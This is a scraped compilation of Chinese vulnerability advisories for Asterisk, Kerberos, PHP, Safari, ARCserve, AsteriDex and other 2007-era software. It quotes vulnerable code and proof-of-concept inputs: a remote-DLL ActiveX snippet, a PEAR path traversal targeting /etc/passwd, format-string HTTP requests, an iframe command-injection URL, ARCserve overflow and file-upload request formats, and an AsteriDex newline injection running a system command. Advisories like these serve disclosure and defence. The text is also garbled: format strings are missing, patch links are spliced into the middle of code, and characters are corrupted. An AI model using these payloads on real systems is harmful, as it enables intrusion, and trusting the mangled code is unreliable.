af_popen(buf,\"r\");    }    char buf[256];    sprintf(buf,\"gzcat \",infile);    a_in = af_popen(buf,\"r\");由于af_popen()最终使用了popen()系统调用，且infile直接来自于命令行参数，因此攻击者能够控制输入的话就可以注入特殊的命令行字符?* 未使用的get_parameter函数Shell命令注入 *文件：aimage/ident.cpp行数?90popen()调用未经验证或转义便使用了一个命令行参数，如果get_parameter函数接受了不可信任来源的参数，就可能导致执行任意命令。但目前这个函数未被使用?       Ripe Website Manager的contact/index.php中存在跨站脚本攻击漏洞。远程攻击者可以借助ripeformpost参数中的第一位的\"<\"<\"，注入任意的web脚本或HTML?      \"Internet Explorer是微软发布的非常流行的WEB浏览器?IE的tblinf32.dll ActiveX控件实现上存在漏洞，远程攻击者可能利用此漏洞控制用户系统?IE中tblinf32.dll或vstlbinf.dll ActiveX控件没有正确地实现IObjectsafety。TlbInf32.dll是一组COM对象，允许Visual Basic和C++程序员访问类型库。该库实现了IObjectSafety?   Report for Clsid: {8B217746-717D-11CE-AB5B-D41203C10000}   RegKey Safe for Script: False   RegKey Safe for Init: False   Implements IObjectSafety: True   IDisp Safe:  Safe for untrusted: caller,dataTypeLibInfoFromFile()函数用于打开文件并从中检索typelib信息?   TypeLibInfoFromFile(ByVal FileName As String) As TypeLibInfo这个函数会接受到DLL文件的webdav/smb共享，以便从远程服务器上的DLL检索信息。如果修改了TypeLibInfoFromFile()调用中的DLL文件将HelpStringDll属性定向到导出恶意DLLGetDocumentation函数的DLL，则在请求HelpString属性时就会执行这个函数?   <object width 00 height  classid=\"CLSID:<CLASSID>\"name=test></object>   x= test.TypeLibInfoFromFile(\"\\\\IPADDRESS\\SHARE\\remote.dll\")   &#039; Call the remote DLLGetDocumentation function   alert(x.Interfaces.Item(a).Members.Item(b).HelpString)如果用户受骗访问了恶意站点的话就可能导致执行任意指令。成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限，那些帐户被配置为拥有较少系统用户权限的用户比具有管理用户权限的用户受到的影响要小。\"       Asterisk是一款PBX系统的软件，运行在Linux系统上，支持使用SIP、IAX、H323协议进行IP通话?Asterisk的SIP/SDP处理器中存在多个远程栈溢出漏洞，远程攻击者可能利用此漏洞控制服务器?如果所发送SIP报文中的SDP数据包含有超长的T38参数的话，就可以触发这个溢出，导致执行任意代码。这个漏洞是由chan_sip.c文件中的process_sdp函数调用sscanf所导致的：else if ((sscanf(a, \"T38FaxRateManagement:目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载?<a href=\"ftp://ftp.digium.com/pub/telephony/asterisk\" target=\"_blank\" rel=\"nofollow\">ftp://ftp.digium.com/pub/telephony/asterisk</a><a href=\"http://www.asterisknow.org\" target=\"_blank\" rel=\"nofollow\">http://www.asterisknow.org</a><a href=\"ftp://ftp.digium.com/pub/telephony/aadk\" target=\"_blank\" rel=\"nofollow\">ftp://ftp.digium.com/pub/telephony/aadk</a>\", s) == 1)) {              found = 1;                                                              if (option_debug > 2)                                                   ast_log(LOG_DEBUG, \"RateMangement: \n\", s);                           if (!strcasecmp(s, \"localTCF\"))                                         peert38capability |=                                                    T38FAX_RATE_MANAGEMENT_LOCAL_TCF;                                        (!strcasecmp(s, \"transferredTCF\"))                              peert38capability |=                                                    T38FAX_RATE_MANAGEMENT_TRANSFERED_TCF;                                  上述代码试图从SIP报文中的SDP读取T38FaxRateManagement:选项，然后将后续的字符串拷贝到s。由于对这个字符串没有执行长度检查，因此可以写过s变量的边界，覆盖栈中临近的缓冲区。s在这个函数中被定义为?56字节长的字符数组?SIP/SDP处理器在处理SIP报文中SDP数据的超长T38FaxUdpEC参数时也存在类似的栈溢出?else if ((sscanf(a, \"T38FaxUdpEC:\", s) == 1)) {                       found = 1;                                                              if (option_debug > 2)                                                   ast_log(LOG_DEBUG, \"UDP EC: \n\", s);                                  if (!strcasecmp(s, \"t38UDPRedundancy\")) {                               peert38capability |=                                                    T38FAX_UDP_EC_REDUNDANCY;                                               ast_udptl_set_error_correction_scheme(p->udptl,                         UDPTL_ERROR_CORRECTION_REDUNDANCY);             试图从SIP报文的SDP读取T38FaxUdpEC时会触发这个栈溢出，导致执行任意指令?       GIMP是GNU Image Manipulation Program(GNU图像处理程序)的缩写，是一款跨平台的图像处理软件?GIMP的SUNRAS插件处理还有畸形数据的RAS文件时存在缓冲区溢出漏洞，远程攻击者可能利用此漏洞控制用户机器?SUNRAS插件中set_color_table()函数中存在栈溢出漏洞，plug-ins/common/sunras.c文件中漏洞代码如下：  int ncols, j;                                                                guchar ColorMap[256*3];                                                                                                                                  ncols = sunhdr->l_ras_maplength / 3;                                         if (ncols <= 0) return;                                                                                                                                  for (j = 0; j < ncols; j++)                                                  {                                                                              ColorMap[j*3]   = suncolmap[j];                                             ColorMap[j*3+1] = suncolmap[j+ncols];                                       ColorMap[j*3+2] = suncolmap[j+2*ncols];                                    } 如果用户受骗打开了恶意的.RAS文件的话，就可能触发这个溢出，导致执行任意指令?       PEAR?ldquo;PHP扩展和应用库&rdquo;的缩写，用于为PHP用户提供结构化的开源代码库?PEAR的安装属性实现上存在漏洞，本地攻击者可能利用此漏洞覆盖系统文件?PEAR安装程序没有对package.xml的install-as属性或<install>标签执行验证，允许攻击者向任意位置安装文件，如果PEAR安装程序以特权用户权限运行的话，就可能覆盖关键的系统文件?用户必须使用PEAR安装程序安装恶意软件包才会受漏洞影响。如果文件包含有类似于以下的install-as属性： <filelist>  <dir name=\"/\">   <file name=\"INSTALL\" role=\"php\" install-as=\"../../test.php\" />  </dir> <!-- / --> </filelist>或类似于以下?file>/<install>标签? <contents>  <dir name=\"/\">   <file name=\"INSTALL\" role=\"php\" />  </dir> <!-- / --> </contents>... <phprelease>  <filelist>   <install as=\"../../test.php\" name=\"INSTALL\" />  </filelist> </phprelease>则PEAR安装程序就会将INSTALL文件安装到php_dir配置文件所指定最低目录两层之上。例如，如果php_dir?usr/local/lib/php，install-as属性为 ../../../../etc/passwd，则PEAR安装程序就会覆盖/etc/passwd文件?       ibexif是用C编的函数库，用于从图形文件中读写EXIF元信息?libexif在处理图形文件中的畸形EXIF信息时存在整数溢出漏洞，远程攻击者可能利用此漏洞控制客户机?如果用户受骗打开了恶意的图形文件的话，就可能触发这个溢出，导致使用该函数库的应用程序崩溃或执行任意指令。漏洞代码位于libexif/exif-data.c文件186行的exif_data_load_data_entry()函数?/* Sanity check */if (size < doff + s)return;entry->data = exif_data_alloc (data, s);if (entry->data) {entry->size = s;memcpy (entry->data, d + doff, s);}对于以下例子?s=296doff=4294901874s=65535doff+s?294967409，这个值小于s，而C语言使用2?2次方(2^sizeof(int))算法，因此doff+s?13?       GD是一个开源的代码库，用于为站点动态创建图形?GD图形库在处理畸形的PNG图形时存在漏洞，远程攻击者可能利用此漏洞导致相关的应用进入死循环?GD库的libpng解码器的libpng代码(png_read_data())与libgd回调(gdPngReadData())之间没有正确地检测截短的输入，导致死循环，libpng的png_read_info()函数无法返回，函数库会消?00%的CPU资源?/* id: gdbad3.c, Xavier Roche, May. 2007 *//* gcc gdbad3.c -o bad -lgd  & & ./bad */#include <stdio.h>#include <stdlib.h>#include \"gd.h\"static const unsigned char pngdata[93];int main(void) {  gdImagePtr im;  if ( ( im = gdImageCreateFromPngPtr(93, (char*)  &pngdata[0]) ) != NULL) {    fprintf(stderr, \"success!\n\");    gdImageDestroy(im);  } else {    fprintf(stderr, \"failed!\n\");  }  return 0;}/* PNG data */static const unsigned char pngdata[93] = {137,80,78,71,13,10,26,10,0,0,0,13,73,72,68,82,0,0,0,120,0,0,0,131,8,6,0,0,0,70,49,223,8,0,0,0,6,98,75,71,68,0,255,0,255,0,255,160,189,167,147,0,0,0,9,112,72,89,115,0,0,92,70,0,0,92,70,1,20,148,67,65,0,0,0,9,118,112,65,103,0,0,0,120,0,0,0,131,0,226,13,249,45};如果用户up到png_read_info()并试图finish的话，就可以看到函数由于无限的调用gdPngReadData()而无法返回?       Kerberos是一款广泛使用的使用强壮的加密来验证客户端和服务器端的网络协议。MIT Kerberos 5是一种常用的开源Kerberos实现?Kerberos中负责处理重新命名主体的代码中存在缓冲区溢出漏洞，远程攻击者可能利用此漏洞控制服务器?rename_principal_2_svc函数没有对用户提供数据执行边界检查便拷贝到了固定大小的缓冲区，漏洞代码如下：   542 generic_ret *  543 rename_principal_2_svc(rprinc_arg *arg, struct svc_req *rqstp)  544 {  545     static generic_ret          ret;  546     char                        *prime_arg1,  547                                 *prime_arg2;  548     char                        prime_arg[BUFSIZ];  ...  570     if (krb5_unparse_name(handle->context, arg->src,  &prime_arg1) ||  571         krb5_unparse_name(handle->context, arg->dest,  &prime_arg2)) {  572          ret.code = KADM5_BAD_PRINCIPAL;  573          goto exit_func;  574     }  575     sprintf(prime_arg, \"目前厂商已经发布了升级补丁以修复这个安全问题，补丁下载链接：Debian------Debian已经为此发布了一个安全公?DSA-1323-1)以及相应补丁:DSA-1323-1：New krb5 packages fix several vulnerabilities链接?<a href=\"http://www.debian.org/security/2007/dsa-1323\" target=\"_blank\" rel=\"nofollow\">http://www.debian.org/security/2007/dsa-1323</a> 补丁下载?Source archives:<a href=\"http://security.debian.org/pool/updates/main/k/krb5/krb5_1.3.6-2sarge5.dsc\" target=\"_blank\" rel=\"nofollow\">http://security.debian.org/pool/updates/main/k/krb5/krb5_1.3.6-2sarge5.dsc</a> Size/MD5 checksum:782 b600466763baa4f89a8fed5a832eb9d3<a href=\"http://security.debian.org/pool/updates/main/k/krb5/krb5_1.3.6-2sarge5.diff.gz\" target=\"_blank\" rel=\"nofollow\">http://security.debian.org/pool/updates/main/k/krb5/krb5_1.3.6-2sarge5.diff.gz</a> Size/MD5 checksum: 669293 0e9dfa39e8db2e0ce871ba40c46c925e<a href=\"http://security.debian.org/pool/updates/main/k/krb5/krb5_1.3.6.orig.tar.gz\" target=\"_blank\" rel=\"nofollow\">http://security.debian.org/pool/updates/main/k/krb5/krb5_1.3.6.orig.tar.gz</a> Size/MD5 checksum:6526510 7974d0fc413802712998d5fc5eec2919Architecture independent components:<a href=\"http://security.debian.org/pool/updates/main/k/krb5/krb5-doc_1.3.6-2sarge5_all.deb\" target=\"_blank\" rel=\"nofollow\">http://security.debian.org/pool/updates/main/k/krb5/krb5-doc_1.3.6-2sarge5_all.deb</a> Size/MD5 checksum: 718836 58c01536ff87db5d3492264349fe844cAlpha architecture:<a href=\"http://security.debian.org/pool/updates/main/k/krb5/krb5-admin-server_1.3.6-2sarge5_alpha.deb\" target=\"_blank\" rel=\"nofollow\">http://security.debian.org/pool/updates/main/k/krb5/krb5-admin-server_1.3.6-2sarge5_alpha.deb</a> Size/MD5 checksum: 115250 ac5498fab92f1047f47f45bb8269fcee<a href=\"http://security.debian.org/pool/updates/main/k/krb5/krb5-clients_1.3.6-2sarge5_alpha.deb\" target=\"_blank\" rel=\"nofollow\">http://security.debian.org/pool/updates/main/k/krb5/krb5-clients_1.3.6-2sarge5_alpha.deb</a> Size/MD5 checksum: 247680 f5201ab228a84b6f25ed42e422f6fd92<a href=\"http://security.debian.org/pool/updates/main/k/krb5/krb5-ftpd_1.3.6-2sarge5_alpha.deb\" target=\"_blank\" rel=\"nofollow\">http://security.debian.org/pool/updates/main/k/krb5/krb5-ftpd_1.3.6-2sarge5_alpha.deb</a> Size/MD5 checksum:62994 fd67dbebb83e11fe7a8d35b4a5209293<a href=\"http://security.debian.org/pool/updates/main/k/krb5/krb5-kdc_1.3.6-2sarge5_alpha.deb\" target=\"_blank\" rel=\"nofollow\">http://security.debian.org/pool/updates/main/k/krb5/krb5-kdc_1.3.6-2sarge5_alpha.deb</a> Size/MD5 checksum: 137138 d44e84b8e1c36215644d8224ae685e96<a href=\"http://security.debian.org/pool/updates/main/k/krb5/krb5-rsh-server_1.3.6-2sarge5_alpha.deb\" target=\"_blank\" rel=\"nofollow\">http://security.debian.org/pool/updates/main/k/krb5/krb5-rsh-server_1.3.6-2sarge5_alpha.deb</a> Size/MD5 checksum:89720 a4b4f7829ef043e7013887fdb967606f<a href=\"http://security.debian.org/pool/updates/main/k/krb5/krb5-telnetd_1.3.6-2sarge5_alpha.deb\" target=\"_blank\" rel=\"nofollow\">http://security.debian.org/pool/updates/main/k/krb5/krb5-telnetd_1.3.6-2sarge5_alpha.deb</a> Size/MD5 checksum:72246 cf93e00c42669deba711fcfbde5285c8<a href=\"http://security.debian.org/pool/updates/main/k/krb5/krb5-user_1.3   unicon-imc2是Debian操作系统中所使用的中文输入法库。unicon-imc2在使用环境变量数据时存在缓冲区溢出漏洞，本地攻击者可能利用此漏洞提升自己的权限。unicon-imc2库没有安全地使用HOME环境变量，如果用户使用了链接到该函数库的应用程序的话就可能触发缓冲区溢出，导致以root用户权限执行任意指令。漏洞代码位?unicon/ImmModules/cce/CCE_pinyin.c文件中：static intIMM_Flush (){  char name[256];  sprintf(name,\"目前厂商已经发布了升级补丁以修复这个安全问题，补丁下载链接：<a href=\"http://www.debian.org/security/2007/dsa-1328\" target=\"_blank\" rel=\"nofollow\">http://www.debian.org/security/2007/dsa-1328</a>/.pyinput/usrphrase.tab\",getenv(\"HOME\"));  SaveUsrPhrase(name);  sprintf(name,\"/.pyinput/sysfrequency.tab\",getenv(\"HOME\"));  SavePhraseFrequency(name);  return 1;}此外/unicon/ImmModules/cce/xl_pinyin.c文件中也存在类似问题。\"       PHP是一种流行的WEB服务器端编程语言?PHP中的chunk_split函数在处理畸形参数时存在整数溢出漏洞，本地攻击者可能利用此漏洞提升自己的权限?PHP中chunk_split函数?963行试图为函数结果分配充分的内存大小，但没有执行任何检查便使用了srclen和chunklen参数块。如果值的块和endlen大于65534字节的话，就会触发整数溢出，分配错误的内存大小，导致堆溢出?ext/standard/string.c?1953 static char *php_chunk_split(char *src, int srclen, char *end,        int endlen, int chunklen, int *destlen)1954 {1955     char *dest;1956     char *p, *q;1957     int chunks; /* complete chunks! */1958     int restlen;19591960     chunks = srclen / chunklen;1961     restlen = srclen - chunks * chunklen; /* srclen % chunklen */19621963     dest = safe_emalloc((srclen + (chunks + 1) * endlen + 1),sizeof(char), 0);19641965     for (p = src, q = dest; p < (src + srclen - chunklen + 1); ) {1966         memcpy(q, p, chunklen);1967         q += chunklen;1968         memcpy(q, end, endlen);1969         q += endlen;1970         p += chunklen;1971     }       Mbedthis Software AppWeb是一款HTTP服务程序?AppWeb在处理URL的协议部分时存在格式串错误，远程攻击者可能利用此漏洞导致拒绝服务?在MprLogToFile::logEvent()函数中，如果没有定义实际的文件描述符，就会将一些错误记录到STDERR，执行以下调用：======= start code ============if (logFd < 0  & & level <= 1) {//// Always output fatal and error messages//mprFprintf(MPR_STDERR, buf);return;}// OPT -- could get length abovewrite(logFd, buf, strlen(buf));========= end code ==========如果用户提交的GET请求包含有特殊字符的话，如：\"GET %n://localhost:80/index.html HTTP/1.1..Host: 172.19.15.11..User-Agent: Security test..Content-Length: 0..Cache-Control: no-cache....\r\n\r\n\"\"GET 临时解决方法?* 在appweb.conf中设置ErrorLog指令?目前厂商还没有提供补丁或者升级程序，建议使用此软件的用户随时关注厂商的主页以获取最新版本： <a href=\"http://www.mbedthis.com/\" target=\"_blank\" rel=\"nofollow\">http://www.mbedthis.com/</a> ://localhost:80/index.html HTTP/1.1..Host: 172.19.15.11..User-Agent: Security test..Content-Length: 0..Cache-Control: no-cache....\r\n\r\n\"\"GET %d://localhost:80/index.html HTTP/1.1..Host: 172.19.15.11..User-Agent: Security test..Content-Length: 0..Cache-Control: no-cache....\r\n\r\n\"服务器无法找到这样的页面，于是试图向stderr写入错误消息。当将上述字符串做为buf参数传送给mprFprintf时，mprFprintf(更具体来讲是mprSprintfCore)试图??d?匹配到列表的参数，但列表中根本就不存在参数，这就导致出现分段错误，守护程序会崩溃。成功利用这个漏洞要求启用了日志功能但appweb.conf中没有ErrorLog指令?       Firebird SQL是一个全功能的轻量级免维护数据库?Firebird SQL数据库默认监听于TCP 3050端口的数据库服务fbserver.exe中存在缓冲区溢出漏洞，远程攻击者可能利用此漏洞控制服务器?该服务在处理connect请求(0x1)时以如下方式拆分?typedef struct p_cnct{    P_OP p_cnct_operation;          /* OP_CREATE or OP_OPEN */    USHORT p_cnct_cversion;         /* Version of connect protocol */    P_ARCH p_cnct_client;           /* Architecture of client */    CSTRING p_cnct_file;            /* File name */    USHORT p_cnct_count;            /* Protocol versions understood */    CSTRING p_cnct_user_id;         /* User identification stuff */    struct p_cnct_repeat    {        USHORT p_cnct_version;      /* Protocol version number */        P_ARCH p_cnct_architecture; /* Architecture of client */        USHORT p_cnct_min_type;     /* Minimum type */        USHORT p_cnct_max_type;     /* Maximum type */        USHORT p_cnct_weight;       /* Preference weight */    }    p_cnct_versions[10];} P_CNCT;如果为p_cnct_count指定了超大值的话，就会在报文的XDR处理中出现未经检查的循环，导致覆盖本地rem_port结构及其vtable。具体来说，在XDR处理的下一次迭代中会调用rem_port->receive函数指针。有漏洞的代码如下：protocol.cpp:318for (i = 0, tail = connect->p_cnct_versions; i < connect->p_cnct_count; i++, tail++){    MAP(xdr_short, reinterpret_cast(tail->p_cnct_version));    MAP(xdr_enum, reinterpret_cast(tail->p_cnct_architecture));    MAP(xdr_u_short, tail->p_cnct_min_type);    MAP(xdr_u_short, tail->p_cnct_max_type);    MAP(xdr_short, reinterpret_cast(tail->p_cnct_weight));}在循环操作中应检查tail的大小?       Apple Safari是苹果家族操作系统所使用的WEB浏览器?Safari在处理URL参数时存在漏洞，远程攻击者可能利用此漏洞控制用户机器?Windows平台上的URL协议处理器在运行时会以特定的命令行参数执行进程。Windows平台上的Safari没有对这些参数执行正确的输入验证，因此攻击者可以绕过预期的限制注入命令。典型的URL请求，如myprotocol://someserver.com/someargument，会被转换成以下的命令行重组?    \"C:\Program Files\My Application\myprotocol.exe\" \"someserver.com/someargument\" 但这还不足以向命令行传送任意字符，还需要借助URL转义，将myprotocol://someserver.com/some\"[SPACE]参数转换为：    \"C:\Program Files\My Application\myprotocol.exe\" \"someserver.com/some\"%20argument 转义后仍无法攻击Safari，因为所执行的命令行是无效的。但如果通过IFRAME单元处理这些请求的时候Safari就无法正确地验证输入，例如：    <iframe src=&#039;myprotocol://someserver.com\" < foo > bar | foobar \"arg1&prime;></iframe> 会被转换为以下命令行?    \"C:\Program Files\My Application\myprotocol.exe\" \"someserver.com\" < foo > bar | foobar \"arg1&Prime; 因此可以在Windows平台上对整个URL协议处理器执行攻击，通过telnet或callto协议向参数提供未经过滤的输入?       ARCServe Backup for Laptops and Desktops (L &D)是适用于中小业务的ARCServe Backup备份工具版本?ARCserve L&D在处理RPC接口上的畸形请求数据时存在漏洞，远程攻击者可能利用此漏洞控制服务器或执行目录遍历?ARCserve L&D使用TCP/1900端口做为RPC接口管理ARCserve L &D服务器，正常的通讯示例如下?    0000000027rxrLogin~~administrator    ---------------------------------------------    Field 1: 10-digit base10 command length field (\"0000000027\")    Field 2: RPC command (\"rxrLogin\")    Field 3: Constant Argument Delimiter (\"~~\")    Field 4: Argument (\"administrator\")#1 认证用户名缓冲区溢出rxRPC.dll的认证部?通过TCP/1900访问)中存在栈溢出漏洞。合法的认证报文示例如下?    0000000013rxrLogin~~administrator认证时使用wsprintfW将administrator参数拷贝到了栈上0x1AC大小的缓冲区，但没有执行字符串长度检查，如果在第一个认证请求中发送了超长用户名的话就可以触发可利用的溢出?#2 认证口令缓冲区溢?rxRPC.dll的认证部分存在栈溢出漏洞。带有口令的合法认证请求示例如下?    1: 0000000030rxrLogin~~administrator~~0000200    2: MyPasswordIs1234第一个rxrLogin请求的第二个参数定义了下一个请求中所要发送口令的长度。尽管已经验证了第二个请求中的口令字符串长度为正确的长度，但没有对口令长度执行边界检查。如果在第二个请求中的超长口令指定了超长口令长度的话，就会溢出口令字符串目的地所使用的栈缓冲区?#3 认证口令整数溢出rxRPC.dll的认证部分存在栈溢出漏洞。带有无效口令的合法认证请求示例如下?    1: 0000000030rxrLogin~~administrator~~18    2: 000000000000000000加密的无效口令可能导致可利用的情况：    .text: 00231F24        mov    cl, [esi+8]    .text: 00231F27        and    ecx, 0x0F    .text: 00231F2A        add    esp, 8    .text: 00231F2D        dec    ecx    ; XXXX Integer Overflow If ECX = 0    .text: 00231F2E        mov    [esp+0x7C+var_6C], eax    .text: 00231F32        mov    dwPasswordCopyLength, ecx    .text: 00231F38        mov    eax, ecx    .text: 00231F3A        lea    esi, [esp+0x7C+var_6C]    .text: 00231F3E        mov    edi, ebx    .text: 00231F40        shr    ecx, 2    .text: 00231F43        rep movs     ; XXXX EXCEPTION: HITS PAGE BOUNDARY XXXX源缓冲区中的数据包含有大量不可控的数据，但还存在用户名的拷贝，因此如果在原始报文中指定了超长用户名的话就会覆盖异常处理器?#4 任意文件上传rxRPC.dll的未经认证通讯存在任意文件上传漏洞。上传请求的文件示例如下?    1: 0000000056rxrReceiveFileFromServer~~8~~test1234.txt~~4~~3675727989    2: 0000000031~~<file_contents>请求的第一个参数指定了rxrReceiveFileFromServer的子命令，数?表示文件会上传到ARCserve L &D的安装目录；第二个参数指定了文件目标名称；第三个参数指定了目标文件的长度；第五个参数指定了入站文件的CRC32哈希?但rxRPC.dll没有防范通过子函?的目录遍历，因此如果文件名中包含有\"..\\"的话，就可能导致以系统级权限向任意目录写入任意文件?#5 多个类似的缓冲区溢出有八个通过TCP/1900端口可访问的函数中存在缓冲区溢出，示例如下：    rxsUseLicenseIni~~<overflow>    rxsLicGetSiteId~~<overflow>    rxsGetLogFileNames~~<overflow>~~40000    rxsGetBackupLog~~aa~~<overflow>~~40000    rxsBackupComplete~~aa~~aa~~aa~~<overflow>~~aa    rxsSetDataGrowthScheduleAndFilter~~aa~~aa~~aa~~aa~~<overflow>    rxsSetDefaultConfigName~~<overflow>    rxrSetMessageLogSettings~~65~~45~~79~~65~~<overflow>~~52~65~73~65~61~72~63~68~21       PHP::HTML是一套HTML类，用于帮助创建复杂的文档?PHP::HTML处理用户请求时存在输入验证漏洞，远程攻击者可能利用此漏洞在服务器上执行任意命令?PHP::HTML的phphtml.php脚本中没有正确地验证htmlclass_path参数的输入，允许攻击者通过包含任意本地或外部资源导致执行任意代码。漏洞代码如下：<?define (PHPHTML_VERSION, \"0.6.4\");/* gettext is not implemented for now*/$use_gettext=0;/* We need to know where the PHP::HTML tree is installed.*/if (strlen(chop($htmlclass_path))==0) $htmlclass_path=\".\";if ($use_gettext==1){   if (function_exists(\"gettext\"))   {       $gettext_enable=1;   }}include(\"$htmlclass_path/ext.php\");  /* Some extenstions to PHP */include(\"$htmlclass_path/core.php\");  /* PHP::HTML Core */include(\"$htmlclass_path/xhtml.php\");  /* XHTML extensions */include(\"$htmlclass_path/xhtml_table.php\");  /* XHTML tables extensions */include(\"$htmlclass_path/xhtml_forms.php\");  /* XHTML forms extensions */include(\"$htmlclass_path/xhtml_doc.php\");  /* XHTML document extension */include(\"$htmlclass_path/wml.php\");  /* WML extension */成功攻击要求打开了register_globals选项?       Ingres是很多CA产品默认所使用的数据库后端?Ingres SQL函数uuid_from_char()可从UUID的字符串表示创建UUID，例如：select uuid_from_char(&#039;11111111-2222-3333-4444-555555555555&#039;)如果向uuid_from_char传送了超长字符串参数，就可能溢出栈缓冲区，覆盖保存的返回地址，将执行路径重新定向到攻击者所选择的地址?Ingres verifydb工具可以解析duveutil.c文件duve_get_args函数中的命令行参数。如果传送了以下形式的参数：-dbms_testAAAAAAAAAAAAAA...<很多A>就会导致执行以下代码?        case &#039;d&#039;:        /* debug flag - should be 1st parameter */        if (MEcmp((PTR)argv[parmno], (PTR)\"-dbms_test\", (u_i2)10)                    ==DU_IDENTICAL )        {            char    numbuf[100];    /* scratch pad to read in number*/            /* the DBMS_TEST flag was specified.  See if a numeric            ** value was attached to it.  If so, convert to decimal.            */            if (argv[parmno][10])            {            STcopy ( &argv[parmno][10], numbuf);            cv_numbuf(numbuf,  &duve_cb->duve_dbms_test);            }            else            duve_cb->duve_dbms_test = -1;        }        else            duve_cb->duve_debug = TRUE;        break;Ingres没有执行长度检查便使用STcopy函数?dbms_test字符串后的参数数据拷贝到了numbuf缓冲区，这导致覆盖栈中的变量，包括所保存的返回地址?       Net::DNS是用Perl实现的DNS解析器?Net::DNS实现上存在漏洞，远程攻击者可能利用此漏洞导致DNS服务器被欺骗或拒绝服务?发送了自我引用的畸形DNS报文(如www.example.<pointer>中的指针再次指向www)的话，Net::DNS中的PP实现可能会陷入死循环?       Barcode ActiveX软件包用于管理条码的打印?Barcode ActiveX控件实现上存在缓冲区溢出漏洞，远程攻击者可能利用此漏洞控制用户机器?BarcodeAx.dll的BeginPrint导出方式没有正确地验证所接收参数的大小，存在栈溢出漏洞：Sub BeginPrint (     ByVal name  As String )如果用户向该方式传送了超过656字节的超长字符串的话，就可能导致EBP + EIP覆盖，逆向代码如下?7C97DF40    PUSH 07C97DF42    PUSH ESI7C97DF43    CALL 7C97CDC97C97DF48    MOV EBX,[EBP+10]7C97DF4B    LEA EDI,[EBX-8]7C97DF4E    MOV [EBP-2C],EDI7C97DF51    MOVZX EAX,WORD PTR [EDI]      <--- CRASH7C97DF54    SHL EAX,37C97DF57    MOV [EBP-30],EAX7C97DF5A    PUSH 7C97E11C7C97DF5F    PUSH EDI7C97DF60    PUSH ESI7C97DF61    CALL 7C97CC6D7C97DF66    TEST AL,AL7C97DF68    JE 7C97E0BF       Lotus Domino/Notes服务器是一款基于WEB合作的应用程序架构，运行在Linux/Unix和Microsoft Windows操作系统平台下?Lotus Domino/Notes实现上存在多个安全漏洞，远程攻击者可能利用这些漏洞获取敏感信息或控制服务器?如果Domino服务器上配置启用了IMAP服务的话，则拥有有效凭据且在TCP 143端口上创建了到IMAP Domino服务器的TCP会话的攻击者可以触发缓冲区溢出，导致拒绝服务或执行任意指令?如果结合特定的@公式命令使用Evaluate LotusScript方式设计视图和代理的话，就可能返回用户通常无法访问的信息，具体取决于视图和代理的编写方式和当时服务器或用户的身份?如果要使用基于Domino服务器的CA进程，就必须在服务器控制台上发布一些命令，其中的activate(tell ca activate <certifier number> <password>)和unlock(tell ca unlock <idfile> <password>)命令要求使用口令，但某些Domino版本会在console.log文本文件和管理面板中明文显示口令?      MySQLDumper是用PHP和Perl编写的MySQL数据库备份脚本。MySQLDumper对脚本本身的访问控制实现上存在漏洞，远程攻击者可能利用此漏洞非授权访问到脚本功能。在所生成?htaccess文件中使用了Apache指令LIMIT，但LIMIT指令中的参数无法充分地保护文件夹? <Limit GET>口令保护仅对HTTP GET请求有效，而对HTTP POST之类的请求无效，因此如果用户使用POST请求受保护MySQLDumper文件夹中的文件的话，就不会要求输入用户名和口令，导致.htaccess/.htpasswd保护完全失效?      \"Imlib是一种图形浏览应用文件库，用于Gnome图形用户环境?Imlib在处理畸形格式的BMP图像文件时存在漏洞，攻击者可能利用此漏洞导致使用了程序库的应用陷入死循环?Imlib库的_LoadBMP函数从BMP文件读取了BPP值并使用该值确定在主文件处理循环中的每一步应读取多少位，但以下行没有正确地检测无效的?x0000?if (bpp != 1 && bpp != 4 && bpp != 8 && bpp && 16 && bpp != 24 && bpp != 32) fprintf(stderr, \"IMLIB ERROR: unknown bitdepth in file\n\");return NULL;错误地引用了&& bpp &&导致无法传?x0000?由于使用的bpp值为0x0000，以下循环：  for (line = (*h - 1); line >= 0; line--)    {      linepos = 0;      for (column = 0; column < *w;)    {无法继续，因为循环中的任何情况都不会匹配bpp值为0x0000，这样程序就会陷入死循环。\"       Yoggie Pico是一款小巧的USB设备，可实现防火墙和反病毒功能?Yoggie Pico在处理用户提交的请求数据时存在漏洞，远程攻击者可能利用此漏洞在设备上执行任意命令?Yoggie Pico安全设备的Web接口开放了ping功能以便于诊断。这个接口以ping -c 10 <given ip>的形式将输入的IP/主机名直接传送给了ping命令，并对\"&\"、\"；\"和管道执行了基本安全检查，但没有检查反引号(\"`\")，这允许攻击者通过提交特制的URL请求在设备上以root用户权限执行任意命令?      AsteriDex是Asterisk/Trixbox PBX的便携式电子电话簿。AsteriDex的脚本处理用户请求数据时存在输入验证漏洞，远程攻击者可能利用此漏洞在服务器上执行任意命令。AsteriDex所使用的callboth.php脚本没有充分地验证IN和OUT参数。该脚本在运行时要在本地主机5038/TCP端口登录到控制台服务器，然后发布Action: Originate命令建立桥接的呼叫，相关代码如下? fputs ($fp, \"Action: login\r\n\");  fputs ($fp, \"Username: phpagi\r\n\");  fputs ($fp, \"Secret: phpagi\r\n\");  fputs ($fp, \"Events: off\r\n\r\n\");  sleep(1) ;  fputs ($fp, \"Action: Originate\r\n\");  fputs ($fp, \"Channel: $IN\r\n\");              << Command injection  fputs ($fp, \"Context: custom-callboth\r\n\");  fputs ($fp, \"Exten: $OUT\r\n\");               << Command injection  fputs ($fp, \"Priority: 1\r\n\r\n\");除了测试字符串长度外没有执行任何检查便?_GET[&#039;IN&#039;]设置?IN，所有传送给$IN的字符串应小?00个字符，包括长度检查前附加?IN的sip/字符串。如?IN=123?out=321?CallerID=567，则会话类似于：  Action: login  Username: phpagi  Secret: phpagi  Events: off   Action: Originate  Channel: 123  Context: custom-callboth  Exten: 321  Priority: 1如果?IN中包含有换行符，攻击者就可以向数据流中注入任意命令、劫持通过认证的会话运行所选择的命令。例如，包含有以下内容的$IN字符串：190@example.com\r\nApplication: System\r\nData: echo pwn3d > /tmp/hoku.txt\r\n 会将会话转换为：  Action: login  Username: phpagi  Secret: phpagi  Events: off    Action: Originate  Channel: 190@example.com  Application: System  Data: echo pwn3d > /tmp/hoku.txt    Context: custom-callboth  Exten: 321  Priority: 1这会使用呼叫管理器的System功能执行攻击者所提供的操作系统命令，在上述例子中可以?tmp/hoku.txt文件写入pwn3d。重置会话会失败，因为攻击者已经破坏了原始的Action，导致其他的命令无效。\"       